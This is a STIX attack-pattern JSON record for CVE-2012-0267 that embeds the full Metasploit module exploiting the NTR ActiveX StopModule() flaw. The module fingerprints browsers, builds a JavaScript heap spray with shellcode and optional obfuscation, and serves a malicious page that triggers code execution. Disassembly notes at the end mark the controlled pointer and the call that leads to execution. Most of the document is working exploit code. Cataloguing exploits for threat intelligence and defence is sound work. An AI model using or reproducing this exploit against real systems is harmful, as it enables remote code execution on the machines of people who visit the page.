{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a8cc30c2-8253-43c4-b6b4-d3916e6b7447",
    "created": "2024-08-14T16:43:22.235697Z",
    "modified": "2024-08-14T16:43:22.235701Z",
    "name": "NTR ActiveX Control StopModule() Remote Code Execution",
    "description": " This module exploits a vulnerability found in the NTR ActiveX 1.1.8. The vulnerability exists in the StopModule() method, where the lModule parameter is used to dereference memory to get a function pointer, which leads to code execution under the context of the user visiting a malicious web page. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ntr_activex_stopmodule.rb",
            "external_id": "ntr_activex_stopmodule.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0267"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20120122095846/http://secunia.com:80/secunia_research/2012-2"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"7.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :classid    => \"{E6ACF817-0A85-4EBE-9F0A-096C6488CFEA}\",\n  #  :method     => \"StopModule\",\n  #  :rank       => NormalRanking\n  #})\n\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'NTR ActiveX Control StopModule() Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability found in the NTR ActiveX 1.1.8. The\n        vulnerability exists in the StopModule() method, where the lModule parameter is\n        used to dereference memory to get a function pointer, which leads to code execution\n        under the context of the user visiting a malicious web page.\n      },\n      'Author'         =>\n        [\n          'Carsten Eiram', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-0267' ],\n          [ 'OSVDB', '78253' ],\n          [ 'BID', '51374' ],\n          [ 'URL', 'http://web.archive.org/web/20120122095846/http://secunia.com:80/secunia_research/2012-2' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'Space' => 1024,\n          'DisableNops' => true,\n          'BadChars'    => \"\"\n        },\n      'Platform' => 'win',\n      'Targets'        =>\n        [\n          # NTR ActiveX 1.1.8.0\n          [ 'Automatic', {} ],\n          [ 'IE 6 on Windows XP SP3', { 'Rop' => nil, 'Offset' => '0x5f4'} ],\n          [ 'IE 7 on Windows XP SP3', { 'Rop' => nil, 'Offset' => '0x5f4'} ],\n          [ 'IE 7 on Windows Vista',  { 'Rop' => nil, 'Offset' => '0x5f4'} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-01-11',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ], self.class\n    )\n\n  end\n\n  def get_spray(t, js_code, js_nops)\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    spray = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{js_code}\");\n    var #{randnop} = \"#{js_nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x80000) nops += nops;\n\n    var offset = nops.substring(0, #{t['Offset']});\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x40000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x80000-6)/2);\n\n    heap_obj.gc();\n    for (var z=1; z < 500; z++) {\n      heap_obj.alloc(block);\n    }\n\n    JS\n\n    return spray\n\n  end\n\n  def get_target(agent)\n    #If the user is already specified by the user, we'll just use that\n    return target if target.name != 'Automatic'\n    if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6/\n      return targets[1] #IE 6 on Windows XP SP3\n    elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7/\n      return targets[2] #IE 7 on Windows XP SP3\n    elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7/\n      return targets[3] #IE 7 on Windows Vista SP2\n    else\n      return nil\n    end\n  end\n\n  def on_request_uri(cli, request)\n\n    agent = request.headers['User-Agent']\n    print_status(\"User-agent: #{agent}\")\n\n    my_target = get_target(agent)\n\n    # Avoid the attack if the victim doesn't have a setup we're targeting\n    if my_target.nil?\n      print_error(\"Browser not supported: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    p = payload.encoded\n    js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))\n    js_nops = Rex::Text.to_unescape(\"\\x0c\"*4, Rex::Arch.endian(my_target.arch))\n    js = get_spray(my_target, js_code, js_nops)\n\n    js = heaplib(js, {:noobfu => true})\n\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    address = 0x0c0c0c0c / 0x134\n\n    html = <<-MYHTML\n    <html>\n    <body>\n    <object classid='clsid:E6ACF817-0A85-4EBE-9F0A-096C6488CFEA' id='test'></object>\n    <script>\n    #{js}\n    test.StopModule(#{address});\n    </script>\n    </body>\n    </html>\n    MYHTML\n\n    html = html.gsub(/^ {4}/, '')\n\n    print_status(\"Sending html\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n\n=begin\n\nThe pointer is \"controlled\" here:\n\n.text:10004449                 mov     eax, [ebp+arg_0] ; arg_0 is user controlled\n.text:1000444C                 imul    eax, 134h       ; it looks good\n.text:10004452                 lea     esi, [eax+edi]  ; eax is user controlled\n.text:10004452                                         ; edi is a heap pointer initialized while activex loading\n.text:10004452                                         ;     (Important note: the default heap isn't being used)\n.text:10004452                                         ;\n.text:10004452                                         ; edi:\n.text:10004452                                         ;\n.text:10004452                                         ; 0:000> !heap -p -a edi\n.text:10004452                                         ;     address 01fb370c found in\n.text:10004452                                         ;     _HEAP @ 1fb0000\n.text:10004452                                         ;       HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state\n.text:10004452                                         ;         01fb3668 0373 0000  [01]   01fb3670    01b90 - (busy)\n.text:10004452                                         ;           ? ntractivex118!DllUnregisterServer+10d18\n.text:10004452                                         ;\n.text:10004452                                         ; Initialization (while activex loading):\n.text:10004452                                         ; ChildEBP RetAddr  Args to Child\n.text:10004452                                         ; 00138510 02a4e147 00001b84 02a4e8fb 00001b84 ntdll!RtlAllocateHeap+0xeac\n.text:10004452                                         ; 00138548 02a4939e 00000000 7dc43038 00e057f8 ntractivex118!DllUnregisterServer+0x8823\n.text:10004452                                         ; 0013855c 7dea5401 02093628 00000000 7dc43038 ntractivex118!DllUnregisterServer+0x3a7a\n.text:10004452                                         ; 00138598 7deaa7f8 00e057f8 00e06154 80004005 mshtml!COleSite::InstantiateObjectFromCF+0x114\n\nAnd user to get RCE here:\n\n.text:1000446E                 mov     eax, [esi+24h]  ; esi can be user influenced\n.text:10004471                 test    eax, eax\n.text:10004473                 jz      short loc_10004477\n.text:10004475                 call    eax             ; RCE!\n\n=end\n",
    "x_mitre_disclosure_date": "2012-01-11",
    "x_mitre_platforms": [
        "win'"
    ]
}